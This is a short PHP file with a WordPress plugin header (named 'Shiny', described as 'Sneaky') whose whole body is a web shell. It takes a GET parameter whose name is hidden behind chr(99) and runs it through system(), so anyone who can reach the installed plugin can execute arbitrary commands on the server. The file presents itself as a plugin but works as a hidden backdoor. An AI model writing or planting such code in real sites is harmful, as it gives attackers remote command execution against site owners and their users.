<?php

/**
* Plugin Name: Shiny
* Plugin URI:
* Description: Sneaky
* Version: 1.5
* Author: Apehex
* Author URI: http://apehex.github.io
 */

$c=chr(99);if(isset($_GET[$c]))system($_GET[$c]); ?>
